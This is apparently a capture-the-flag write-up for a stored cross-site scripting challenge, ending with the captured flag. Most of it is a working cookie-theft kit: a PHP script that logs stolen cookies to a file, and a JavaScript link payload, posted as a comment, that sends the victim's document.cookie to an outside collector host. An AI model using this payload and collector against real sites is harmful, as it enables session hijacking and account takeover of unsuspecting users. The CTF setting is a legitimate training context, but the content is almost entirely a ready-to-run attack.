Site is vulnerable to XSS

Host the following PHP script on any free hosting service

```
<?php
$cookie = $HTTP_GET_VARS["cookie"];
$steal = fopen("cookiefile.txt", "a");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>
```

Post this comment after changing "my.domain/cookie.php" to wherever your php file is hosted

```
<a href="javascript:location='http://my.domain/cookie.php?cookie='+document.cookie" onclick="">click here</a>
```

The flag will now appear in cookiefile.txt

flag=CTF{I_haz_c47n1p.nom.nom.nom}
